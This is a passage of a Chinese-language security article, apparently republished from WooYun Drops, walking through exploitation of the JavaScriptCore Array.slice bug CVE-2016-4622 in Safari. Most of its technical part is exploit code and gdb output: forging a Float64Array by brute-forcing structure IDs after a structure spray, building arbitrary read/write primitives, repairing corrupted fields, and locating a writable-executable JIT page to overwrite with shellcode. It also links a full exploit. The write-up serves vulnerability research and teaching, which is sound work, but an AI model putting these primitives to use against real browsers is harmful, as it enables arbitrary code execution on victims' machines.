<li>能够通过leak_obj直接或者间接泄漏，以便于得到其内存地址</li>
<li>能够写入攻击者可控的数据，以便于伪造对象</li>
</ul>
<p>对象中的inline属性能满足以上两个条件。首先，当对象的属性不超过6个时，属性的值会以inline方式在对象内部存储。通过leak_obj泄露了某个对象的地址，也就能间接得知其中属性的内存地址。其次，对象的属性可以写入攻击者可控的数据。当攻击者定义这样一个对象时：</p>
<pre>var obj = {
“pop1”: uint_to_f64(0x414141414141),
“pop2”: uint_to_f64(0x424242424242),
“pop3”: uint_to_f64(0x434343434343),
“pop4”: uint_to_f64(0x444444444444),
“pop5”: uint_to_f64(0x454545454545),
“pop6”: uint_to_f64(0x464646464646)
}</pre>
<p>对应在内存中布局</p>
<pre>0x7ff5f25cfec0: 0x01001500000001b4 0x0000000000000000
0x7ff5f25cfed0: 0x0001414141414141 0x0001424242424242
0x7ff5f25cfee0: 0x0001434343434343 0x0001444444444444
0x7ff5f25cfef0: 0x0001454545454545 0x0001464646464646</pre>
<p><strong>3.2.3 伪造对象的类型</strong></p>
<p>攻击者伪造对象的最终目的是希望利用伪造的对象能够方便的在当前进程全地址空间内实现任意读写，所以攻击者希望伪造的对象能够具备以下三个特征：</p>
<ul>
<li>对象用类似数组的数据结构管理数据，以便支持线性地对数据进行读写操作；</li>
<li>对象内部定义了类似缓冲区基地址以及缓冲区大小的变量，以便实现全地址读写；</li>
<li>数据不会被编码存储，“所存即所写” （what memory stores is what you write）</li>
</ul>
<p>显然在JS中能够最佳符合以上特征的对象就是以下TypedArray</p>
<pre>Int8Array
Uint8Array
Uint8ClampedArray
Int16Array
Uint16Array
Int32Array
Uint32Array
Float32Array
Float64Array</pre>
<p>又因为攻击者的攻击目标是64位系统，所以攻击者选定将Float64Array作为伪造对象的类型。</p>
<p><strong>3.2.4 伪造FLOAT64ARRAY</strong></p>
<p>定义如下Float64Array对象</p>
<pre>var arrbuf = new ArrayBuffer(0x200)
var f64 = new Float64Array(arrbuf)
for(var i=0; i&lt;0x200/8; i++)
{
f64[i] = uint_to_f64(0x414141414140 + i)
}</pre>
<p>对象在内存中的布局如下：</p>
<pre>(gdb) x/10gx 0x7ff66cf77b80
0x7ff66cf77b80: 0x01186c0000000171 0x00007ff66d2059e8
0x7ff66cf77b90: 0x00007ff6b0f44200 0x0000000200000040
print/x ((JSCell)0x01186c0000000171).m_structureID
$6 = 0x171</pre>
<p>0x01186c0000000171是Float64Array对象的JSCell，其中最关键的两个信息一个对象类型0x6C，和structure ID 0x171。这个值虽然不是随机数，但是c0x00007ff66d2059e8是butterfly指针，虽然将butterlfy指针设置任意值并不影响对象的伪造，但是为了保证Exploit的稳定性需要将其设置为一个合法的Butterfly结构指针。<br />
0x00007ff6b0f44200是数据缓冲区的起始地址。</p>
<pre>(gdb) x/10gx 0x00007ff6b0f44200
0x7ff6b0f44200: 0x0000414141414140 0x0000414141414141
0x7ff6b0f44210: 0x0000414141414142 0x0000414141414143
0x7ff6b0f44220: 0x0000414141414144 0x0000414141414145
0x7ff6b0f44230: 0x0000414141414146 0x0000414141414147
0x7ff6b0f44240: 0x0000414141414148 0x0000414141414149</pre>
<p>0x0000000200000040 表示缓冲区的实际大小0x200，以及元素的个数0x40</p>
<p>要伪造一个Float64Array对象，最大难点在如何获得一个正确的Float64Array对象的structure ID。structure ID由函数JSC::StructureIDTable::allocateID中分配，通过代码逻辑可知m_structureID本质上是某个类型对应Structure在Structure Table中的一个索引值。因此理论上攻击者可以通过暴力枚举来猜测这个值。</p>
<pre>function fake_float64array(zombie_obj)
{
var ptr = leak_obj(zombie_obj)
for(var i=start_index; &lt;end_index; i++)
{
zombie_obj[“prop1”] = uint_to_f64(0x250000000000 + i)
var obj = fake_obj(ptr + 0x10)
if(obj instanceof Float64Array)
{
return obj
}
}
return null
}

var dummy =
{
“prop1”:uint_to_f64(0x6c0000000000), //jscell
“prop2”:uint_to_f64(0x424242424242), //butterfly
“prop3”:uint_to_f64(0x434343434343), //elements
“prop4”:uint_to_f64(0x444444444444), //length
“prop5”:uint_to_f64(0x454545454545), //dummy
}
var fake_f64 = fake_float64array(dummy)</pre>
<p>然后需要考虑的问题是如何选取start_index和end_index，也就是暴力枚举的基本范围。start_index的值不能太低，因为instanceof会判断对象是否集成自Object，如果不是则触发Security Assertion造成进程Crash。</p>
<pre>template&lt;typename To, typename From&gt;
inline To jsCast(From* from)
{
ASSERT_WITH_SECURITY_IMPLICATION(!from || from-&gt;JSCell::inherits(std::remove_pointer&lt;To&gt;::type::info())); //inherit from Object?
return static_cast&lt;To&gt;(from);
}</pre>
<p>而Structure Table中低索引位置存储着一些JSC VM内部使用的类型，这些类型和Object没有继承关系。所以如果从比较低的位置开始暴力枚举肯定会出发Security Assertion。除此之外，end_index也不能太大。如果end_index太大则会超出Structure Table的实际范围，同样会因触发Security Assertion而导致</p>
<pre>inline Structure* StructureIDTable::get(StructureID structureID)
{
#if USE(JSVALUE64)
ASSERT_WITH_SECURITY_IMPLICATION(structureID &amp;&amp; structureID &lt; m_capacity);
 return table()[structureID].structure;
#else
 return structureID;
#endif
}</pre>
<p>基于以上限制条件，攻击者采用这样的暴力枚举策略：</p>
<ul>
<li>Step1. 通过Structure Spray给Structure Table扩容</li>
</ul>
<pre>function structure_spray()
{
 for(var i=0; i&lt;0x800; i++)
 {
 eval(“function func”+i.toString()+”(x){this.x=x};var a = new func” + i.toString() + “(1);”)
 }
}</pre>
<ul>
<li>Step2.从一个可靠的位置开始，由高向低依次枚举。</li>
</ul>
<pre>function fake_float64array(zombie_obj)
{
 var ptr = leak_obj(zombie_obj)
 structure_spray()
 for(var i=0x300; i&gt;0; i–)
 {
 zombie_obj[“pop1”] = uint_to_f64(0x6c0000000000 + i)
 var obj = fake_obj(ptr + 0x10)
 if(obj instanceof Float64Array)
 {
 return obj
 }
 }
 return null
}

var dummy =
{
 “prop1”:uint_to_f64(0x6c0000000000), //jscell
 “prop2”:uint_to_f64(0x424242424242), //butterfly
 “prop3”:uint_to_f64(0x434343434343), //elements
 “prop4”:uint_to_f64(0x444444444444), //length
 “prop5”:uint_to_f64(0x454545454545), //dummy
}
var fake_f64 = fake_float64array(dummy)</pre>
<h3>3.3 任意读写</h3>
<p>实现了Float64Array对象的伪造之后，攻击者离AAR和AAW仅剩一步之遥。因为整数和浮点数在对象中以inline方式存储时会被JSValue进行编码，所以攻击者无法直接将希望读写的内存地址写入攻击者定义的dummy对象来作为Float64Array的elements指针。但如果攻击者把一个对象引用对dummy[“prop3”]赋值， 那么攻击者就可以把这个对象的地址当作伪造的Float64Arrray对象的elements指针，从而能够以读写数组的方式的对一个对象的内存进行操作。基于这一思想，攻击者用一个真实的Float64Array对象对dummy[“prop3”]赋值。</p>
<pre>var arrbuf = new ArrayBuffer(0x1000)
var f64 = new Float64Array(arrbuf)
for(var i=0; i&lt;0x200/8; i++)
{
 f64[i] = 0xBAD0BEEF
}

var dummy =
{
 “pop1”:uint_to_f64(0x6c0000000000), //jscell
 “pop2”:uint_to_f64(0x424242424242), //butterfly
 “pop3”:f64, //elements
 “pop4”:uint_to_f64(0x200000040), //length
 “pop5”:uint_to_f64(0x454545454545), //dummy
}
var fake_f64 = fake_float64array(dummy)</pre>
<p>然后以读写fake_f64数组的方式，修改f64对象的elemnts指针。</p>
<pre>function write64(addr, u64)
{
 fake_f64[2] = uint_to_f64(addr)
 f64[0] = uint_to_f64(u64)
}
write64(0x424242424242, 0x414141414141)</pre>
<p>这样就实现了AAR/AAW。</p>
<pre>Thread 1 “WebKitWebProces” received signal SIGSEGV, Segmentation fault.
0x00007fbc3cb181a4 in JSC::JSGenericTypedArrayView&lt;JSC::Float64Adaptor&gt;::setIndex
(gdb) x/i $pc
=&gt; 0x7fbc3cb181a4 JSGenericTypedArrayViewINS_14Float64AdaptorEE8setIndex: movsd %xmm0,(%rcx,%rax,8)
(gdb) info registers
rax 0x0 0
rcx 0x424242424242
(gdb) p/x $xmm0.v2_int64
$2 = {0x414141414141, 0x0}</pre>
<h3>3.4 清理现场</h3>
<p>虽然行文至此攻击者已获得了在当前进程空间内对任意地址读写的能力，但为了提高Exploit的稳定性还必须清理犯罪现场——对伪造Float64Array对象中的buttterfly指针和length长度进行修复。因为这两个字段在垃圾回收阶段会被访问和校验，畸形构造的数据会导致内存崩溃。</p>
<pre>/*leak pointer to fake_f64*/
var ptr_fake_f64 = leak_obj(fake_f64)
/*leak pointer to f64*/
var ptr_f64 = leak_obj(f64)
/*read the butterfly pointer in f64 and copy it to fake_f64*/
write64(ptr_fake_f64 + 8, read64(ptr_f64+8))
/*fixup the length field, setting it to be exactly the same as sizeof(Float64Array)*/
write64(ptr_fake_f64 + 0x18, 0x0000000200000004)</pre>
<h3>3.5 执行Shellcode</h3>
<p>在当某个函数被多次调用后，该函数就会被JS引擎以JIT方式编译为Native Code。可以通过以下方式定义一个函数对象func_obj，然后通过多次多次调用触发JIT</p>
<pre>var js_code = “function rip(){ tmp = [];”
for(var i=0; i&lt;0x1000; i++)
js_code += “tmp[” + i +”]=” + i +”;”
js_code += “};rip()”
var func_obj = new Function(js_code)
/*trigger JIT for func_obj*/
for(var i=0; i&lt;0x200; i++)
func_obj()</pre>
<p>JITCode对象的m_codePtr成员变量存放JIT生成的Native Code所在内存地址。JSFunction和JITCode对象的关系如下图所示：</p>
<p><img class="alignnone size-full wp-image-93620 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/12/BFEF98A0-2EB9-484C-A301-0BFC4EF6B3D1.jpg" alt="bfef98a0-2eb9-484c-a301-0bfc4ef6b3d1" width="1402" height="852" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/12/BFEF98A0-2EB9-484C-A301-0BFC4EF6B3D1.jpg 1402w, http://www.mottoin.com/wp-content/uploads/2016/12/BFEF98A0-2EB9-484C-A301-0BFC4EF6B3D1-300x182.jpg 300w, http://www.mottoin.com/wp-content/uploads/2016/12/BFEF98A0-2EB9-484C-A301-0BFC4EF6B3D1-768x467.jpg 768w, http://www.mottoin.com/wp-content/uploads/2016/12/BFEF98A0-2EB9-484C-A301-0BFC4EF6B3D1-1024x622.jpg 1024w" sizes="(max-width: 1402px) 100vw, 1402px" /></p>
<p>func_obj对象经JIT生成的Native Code的内存页地址为0x7f56a6621aa0, 其内存页属性为可读可写可执行。</p>
<pre>(gdb) x/10i 0x7f56a6621aa0
0x7f56a6621aa0: push %rbp
0x7f56a6621aa1: mov %rsp,%rbp
0x7f56a6621aa4: movabs $0x7f565718b700,%r11
0x7f56a6621aae: mov %r11,0x10(%rbp)
0x7f56a6621ab2: lea -0x70(%rbp),%rsi
0x7f56a6621ab6: movabs $0x7f56643f7400,%r11
0x7f56a6621ac0: cmp %rsi,(%r11)
0x7f56a6621ac3: ja 0x7f56a6621d4c
0x7f56a6621ac9: lea -0x60(%rbp),%rsp
0x7f56a6621acd: test $0xf,%spl

pwndbg&gt; address 0x7f56a6621aa0
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x7f56a6621000 0x7f56a6622000 rwxp 1000 0</pre>
<p>因此所以攻击者可以直接把Shellcode写入func_obj的Native Code所在内存页，然后再调用func_obj就可以实现任意代码执行。攻击者通过以下方式泄露JIT内存页地址：</p>
<pre>/*leak pointer to JSFunction object*/
var ptr_funcobj = leak_obj(func_obj)
/*read pointer to ExecutableBase*/
var ptr1 = read64(ptr_funcobj + 0x18)
/*read pointer to JITCode*/
var ptr2 = read64(ptr1 + 0x18)
/*read m_codePtr*/
var jit = read64(ptr2 + 0x10)</pre>
<h2>0x04 总结</h2>
<p>本文首先分析了JavaScriptCore Array.slice函数OOB漏洞CVE-2016-4622的成因，然后以漏洞利用为目的简要介绍了JavaScriptCore的内部运行机制，最后将整个漏洞利用过程划分为信息泄露、伪造对象、任意读写、清理现场、执行ShellCode这五个步骤并逐一详细介绍了实现思路和实现方法。</p>
<h2>0x05 参考</h2>
<ul>
<li><a href="http://phrack.org/papers/attacking_javascript_engines.html">Attacking JavaScript Engines: A case study of JavaScriptCore and CVE-2016-4622</a></li>
<li><a href="https://github.com/4B5F5F4B/Exploits/blob/master/Safari/CVE-2016-4622/exploit.html">Exploit</a></li>
</ul>
<p>&nbsp;</p>
<p style="text-align: center;"><span style="color: #ff0000;"><strong>*作者：KK(.a.k.a @4B5F5F4B)@玄武实验室，来源：<a style="color: #ff0000;" href="http://drops.wiki/index.php/2016/12/10/jscpwn/">乌云知识库</a></strong></span></p>
                                                        <div class="entry-copyright"><p>原创文章，作者：Drops知识库，如若转载，请注明出处：http://www.mottoin.com/93615.html</p></div>                        </div>
                        <div class="entry-footer">
                            <div class="entry-tag"><a href="http://www.mottoin.com/tag/javascriptcore" rel="tag">JavaScriptCore</a><a href="http://www.mottoin.com/tag/javascript%e5%bc%95%e6%93%8e" rel="tag">JavaScript引擎</a><a href="http://www.mottoin.com/tag/safari" rel="tag">Safari</a><a href="http://www.mottoin.com/tag/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%8a%80%e6%9c%af" rel="tag">漏洞利用技术</a></div>
                            <div class="entry-action">
                                <div class="btn-zan" data-id="93615"><i class="fa fa-thumbs-up"></i> 赞 <span class="entry-action-num">(0)</span></div>

                                
                            </div>
                            <div class="entry-bar">
                                <div class="entry-bar-inner clearfix">
                                                                            <div class="author pull-left">
                                            <a data-user="161" target="_blank" href="http://www.mottoin.com/user/wooyundrops/" class="avatar">
                                                <img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-60 um-avatar um-avatar-gravatar" width="60" height="60" alt="乌云知识库 Drops知识库" />                                                乌云知识库 Drops知识库                                            </a>
                                            <span class="author-title">普通用户</span>                                         </div>
                                                                        <div class="info pull-right">
                                        <div class="info-item meta">
                                            <a class="meta-item j-heart" href="javascript:;" data-id="93615"><i class="fa fa-heart"></i> <span class="data">0</span></a>
                                            <a class="meta-item" href="#comments"><i class="fa fa-comment"></i> <span class="data">0</span></a>
                                                                                    </div>
                                        <div class="info-item share">
                                            <a class="meta-item" href="javascript:;">
                                                <i class="fa fa-wechat"></i>
                                                <span class="wx-wrap">
                                                    <img src="//pan.baidu.com/share/qrcode?w=320&h=320&url=http://www.mottoin.com/93615.html">
                                                    <span>扫码分享到微信</span>
                                                </span>
                                            </a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=tsina&key=&url=http%3A%2F%2Fwww.mottoin.com%2F93615.html&title=Safari%E6%B5%8F%E8%A7%88%E5%99%A8JavaScript%E5%BC%95%E6%93%8EJavaScriptCore%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90" target="_blank"><i class="fa fa-weibo"></i></a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=qzone&key=&url=http%3A%2F%2Fwww.mottoin.com%2F93615.html&title=Safari%E6%B5%8F%E8%A7%88%E5%99%A8JavaScript%E5%BC%95%E6%93%8EJavaScriptCore%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90" target="_blank"><i class="fa fa-qq"></i></a>
                                        </div>
                                        <div class="info-item act">
                                            <a href="javascript:;" id="j-reading"><i class="fa fa-file-text"></i></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                                                        <h3 class="entry-related-title">相关推荐</h3><ul class="entry-related clearfix"><li><a href="http://www.mottoin.com/102142.html" title="Pwn2own漏洞分享系列：利用macOS内核漏洞逃逸Safari沙盒">Pwn2own漏洞分享系列：利用macOS内核漏洞逃逸Safari沙盒</a></li><li><a href="http://www.mottoin.com/99247.html" title="漏洞分析：CVE-2017-0497 via ele7enxxh">漏洞分析：CVE-2017-0497 via ele7enxxh</a></li><li><a href="http://www.mottoin.com/102714.html" title="命令注入雅虎的生产服务器：重新认识双引号和分号的威力">命令注入雅虎的生产服务器：重新认识双引号和分号的威力</a></li><li><a href="http://www.mottoin.com/93762.html" title="MS16-063补丁分析（JSCRIPT9.DLL）">MS16-063补丁分析（JSCRIPT9.DLL）</a></li><li><a href="http://www.mottoin.com/97425.html" title="多款密码管理器应用程序的安全漏洞">多款密码管理器应用程序的安全漏洞</a></li><li><a href="http://www.mottoin.com/101973.html" title="WanaCrypt0r“想哭”勒索蠕虫数据恢复可行性分析报告">WanaCrypt0r“想哭”勒索蠕虫数据恢复可行性分析报告</a></li><li><a href="http://www.mottoin.com/101137.html" title="[CVE-2015-7547]GLIBC GETADDRINFO栈溢出漏洞">[CVE-2015-7547]GLIBC GETADDRINFO栈溢出漏洞</a></li><li><a href="http://www.mottoin.com/101846.html" title="SAML的脆弱性分析">SAML的脆弱性分析</a></li><li><a href="http://www.mottoin.com/96059.html" title="Firefox 50.0.2 释放后重用漏洞分析（CVE-2016-9899）">Firefox 50.0.2 释放后重用漏洞分析（CVE-2016-9899）</a></li><li><a href="http://www.mottoin.com/101779.html" title="[CVE-2016-10033]WordPress &lt; 4.7.1远程代码执行漏洞分析">[CVE-2016-10033]WordPress < 4.7.1远程代码执行漏洞分析</a></li></ul>                        </div>
                        
<div id="comments" class="entry-comments">
    	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/93615.html#respond" style="display:none;">取消回复</a></small></h3><div class="comment-form"><div class="comment-must-login">请登录后评论...</div><div class="form-submit"><div class="form-submit-text pull-left"><a href="http://www.mottoin.com/login">登录</a>后才能评论</div> <input name="submit" type="submit" id="must-submit" class="submit" value="发表"></div></div>	</div><!-- #respond -->
		</div><!-- .comments-area -->                    </div>
                </article>
                    </div>
        <aside class="sidebar">
            <div id="profile-3" class="widget widget_profile">                <div class="cover_photo"></div>
                        <div class="avatar-wrap">
                <a target="_blank" href="http://www.mottoin.com/user/wooyundrops/" class="avatar-link"><img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-120 um-avatar um-avatar-gravatar" width="120" height="120" alt="乌云知识库 Drops知识库" /></a></div>
            <div class="profile-info">
                <p><span class="author-name">乌云知识库 Drops知识库</span><span class="author-title">普通用户</span></p>
                <p class="author-description"></p>
            </div>
            <div class="profile-posts">
                <h3 class="widget-title"><span>最近文章</span></h3>
                <ul>                    <li><a href="http://www.mottoin.com/94449.html" title="使用Hashcat破解外国字符构成的密码的终极指南">使用Hashcat破解外国字符构成的密码的终极指南</a></li>
                                    <li><a href="http://www.mottoin.com/93615.html" title="Safari浏览器JavaScript引擎JavaScriptCore的漏洞技术分析">Safari浏览器JavaScript引擎JavaScriptCore的漏洞技术分析</a></li>
                                    <li><a href="http://www.mottoin.com/90927.html" title="Redis Lua远程代码执行EXP">Redis Lua远程代码执行EXP</a></li>
                </ul>            </div>
            </div><div id="custom_html-3" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><a class="btn-post" href="/question"><i class="fa fa-edit"></i> 我要提问</a></div></div><div id="post-thumb-3" class="widget widget_post_thumb">            <ul>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">“黑客反击”的合法化之争</a></p>
                            <p class="item-date">2017年9月20日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG929-480x300.jpeg" width="480" height="300" alt="美参议员要求电信巨头们回应SS7信令系统的安全问题">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">美参议员要求电信巨头们回应SS7信令系统的安全问题</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG928-480x300.jpeg" width="480" height="300" alt="美国国土安全部发布禁止使用卡巴斯基产品的明细">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">美国国土安全部发布禁止使用卡巴斯基产品的明细</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG906-480x300.jpeg" width="480" height="300" alt="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15057198871-480x300.png" width="480" height="300" alt="全球首款网络安全概念车驶入上海滩">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">全球首款网络安全概念车驶入上海滩</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG897-480x300.jpeg" width="480" height="300" alt="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG896-480x300.jpeg" width="480" height="300" alt="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG150-480x300.jpeg" width="480" height="300" alt="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护</a></p>
                            <p class="item-date">2017年9月17日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG141-480x300.jpeg" width="480" height="300" alt="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场</a></p>
                            <p class="item-date">2017年9月16日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105837.html" title="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG132-480x300.jpeg" width="480" height="300" alt="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105837.html" title="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协</a></p>
                            <p class="item-date">2017年9月16日</p>
                        </div>
                    </li>
                            </ul>
        </div><div id="lastest-products-4" class="widget widget_lastest_products">            <ul class="p-list clearfix">
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105921.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
                                    “黑客反击”的合法化之争                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105858.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG150-480x300.jpeg" width="480" height="300" alt="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">
                                    DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105847.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG141-480x300.jpeg" width="480" height="300" alt="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">
                                    国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105799.html">
                                <img width="480" height="300" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" class="attachment-post-thumbnail size-post-thumbnail j-lazy wp-post-image" alt="暗网系列之：“入店行窃者”的工具、战术和克星" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15054708381-150x150-480x300.png" />                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105799.html" title="暗网系列之：“入店行窃者”的工具、战术和克星">
                                    暗网系列之：“入店行窃者”的工具、战术和克星                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105703.html">
